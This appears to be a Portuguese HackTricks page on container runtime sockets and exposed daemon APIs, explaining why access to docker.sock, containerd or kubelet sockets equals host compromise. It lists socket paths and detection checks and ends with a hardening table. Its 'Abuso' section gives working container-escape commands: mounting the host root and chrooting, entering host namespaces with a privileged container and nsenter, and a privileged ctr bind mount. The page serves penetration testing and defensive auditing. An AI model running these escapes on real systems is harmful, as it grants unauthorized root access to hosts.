# API de Runtime e Exposição do Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Muitos compromissos reais de contêiner não começam com um namespace escape. Eles começam com acesso ao plano de controle do runtime. Se uma workload consegue se comunicar com `dockerd`, `containerd`, CRI-O, Podman, ou kubelet através de um Unix socket montado ou um listener TCP exposto, o atacante pode ser capaz de solicitar um novo contêiner com privilégios maiores, montar o filesystem do host, entrar em namespaces do host ou recuperar informações sensíveis do node. Nesses casos, a API do runtime é a verdadeira fronteira de segurança, e comprometê-la é funcionalmente quase o mesmo que comprometer o host.

Por isso a exposição de sockets do runtime deve ser documentada separadamente das proteções do kernel. Um contêiner com seccomp, capabilities e MAC confinement ordinários ainda pode estar a uma chamada de API de distância do comprometimento do host se `/var/run/docker.sock` ou `/run/containerd/containerd.sock` estiverem montados dentro dele. O isolamento do kernel do contêiner atual pode estar funcionando exatamente como projetado enquanto o plano de gerenciamento do runtime permanece totalmente exposto.

## Modelos de Acesso ao Daemon

Docker Engine tradicionalmente expõe sua API privilegiada através do Unix socket local em `unix:///var/run/docker.sock`. Historicamente também foi exposta remotamente através de listeners TCP como `tcp://0.0.0.0:2375` ou um listener protegido por TLS em `2376`. Expor o daemon remotamente sem TLS forte e autenticação de cliente transforma efetivamente a API do Docker em uma interface de root remota.

containerd, CRI-O, Podman e kubelet expõem superfícies de alto impacto semelhantes. Os nomes e fluxos de trabalho diferem, mas a lógica não. Se a interface permite que o chamador crie workloads, monte caminhos do host, recupere credenciais ou altere contêineres em execução, a interface é um canal de gerenciamento privilegiado e deve ser tratada como tal.

Caminhos locais comuns que valem a pena verificar são:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stacks mais antigos ou mais especializados também podem expor endpoints como `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Estes são menos comuns em ambientes modernos, mas quando encontrados devem ser tratados com a mesma cautela porque representam superfícies de controle de runtime em vez de sockets de aplicação comuns.

## Acesso Remoto Seguro

Se um daemon precisar ser exposto além do socket local, a conexão deve ser protegida com TLS e, preferencialmente, com autenticação mútua, de modo que o daemon verifique o cliente e o cliente verifique o daemon. O velho hábito de expor o Docker daemon via HTTP simples por conveniência é um dos erros mais perigosos na administração de containers, porque a superfície da API é suficientemente poderosa para criar containers privilegiados diretamente.

O padrão histórico de configuração do Docker era:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Em hosts baseados em systemd, a comunicação do daemon também pode aparecer como `fd://`, significando que o processo herda um socket pré-aberto do systemd em vez de vinculá-lo diretamente. A lição importante não é a sintaxe exata, mas a consequência para a segurança. No momento em que o daemon escuta além de um socket local com permissões restritas, a segurança de transporte e a autenticação do cliente tornam-se obrigatórias em vez de hardening opcional.

## Abuso

Se um runtime socket estiver presente, confirme qual é, se existe um cliente compatível e se o acesso raw HTTP ou gRPC é possível:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Esses comandos são úteis porque distinguem entre um caminho inexistente, um socket montado mas inacessível e uma API privilegiada ativa. Se o cliente obtiver sucesso, a próxima pergunta é se a API pode lançar um novo container com um bind mount do host ou compartilhamento do namespace do host.

### Exemplo completo: Docker Socket para a raiz do host

Se `docker.sock` for acessível, a forma clássica de escape é iniciar um novo container que monte o sistema de arquivos raiz do host e então executar `chroot` nele:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Isso fornece execução direta com privilégios root no host através do Docker daemon. O impacto não se limita a leituras de arquivos. Uma vez dentro do novo container, o atacante pode alterar arquivos do host, coletar credenciais, implantar persistência ou iniciar cargas de trabalho privilegiadas adicionais.

### Exemplo completo: Docker Socket To Host Namespaces

Se o atacante preferir entrada por namespaces em vez de acesso apenas ao sistema de arquivos:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Este caminho atinge o host solicitando ao runtime que crie um novo container com exposição explícita do host-namespace em vez de explorar o atual.

### Exemplo completo: containerd Socket

Um mounted `containerd` socket geralmente é igualmente perigoso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
O impacto é, novamente, host compromise. Mesmo que ferramentas específicas do Docker estejam ausentes, outra runtime API ainda pode oferecer o mesmo poder administrativo.

## Verificações

O objetivo dessas verificações é responder se o container pode alcançar qualquer management plane que deveria ter permanecido fora do trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
O que é interessante aqui:

- Um socket de runtime montado é geralmente um primitivo administrativo direto em vez de mera divulgação de informação.
- Um listener TCP na porta `2375` sem TLS deve ser tratado como condição de comprometimento remoto.
- Variáveis de ambiente como `DOCKER_HOST` frequentemente revelam que a carga de trabalho foi intencionalmente projetada para se comunicar com o runtime do host.

## Padrões do runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimentos manuais comuns |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket por padrão | `dockerd` escuta no socket local e o daemon geralmente roda como root | montagem de `/var/run/docker.sock`, exposição de `tcp://...:2375`, TLS fraco ou ausente em `2376` |
| Podman | CLI sem daemon por padrão | Não é necessário um daemon privilegiado de longa duração para uso local comum; sockets de API ainda podem ser expostos quando `podman system service` está habilitado | exposição de `podman.sock`, execução do serviço de forma ampla, uso da API com privilégios de root |
| containerd | Socket privilegiado local | API administrativa exposta através do socket local e normalmente consumida por ferramentas de nível superior | montagem de `containerd.sock`, acesso amplo via `ctr` ou `nerdctl`, exposição de namespaces privilegiados |
| CRI-O | Socket privilegiado local | O endpoint CRI é destinado a componentes confiáveis locais do nó | montagem de `crio.sock`, exposição do endpoint CRI para cargas de trabalho não confiáveis |
| Kubernetes kubelet | API de gerenciamento local ao nó | Kubelet não deve ser amplamente acessível a partir dos Pods; o acesso pode expor estado dos pods, credenciais e recursos de execução dependendo de authn/authz | montagem de sockets ou certificados do kubelet, autenticação fraca do kubelet, rede do host mais endpoint kubelet acessível |
{{#include ../../../banners/hacktricks-training.md}}
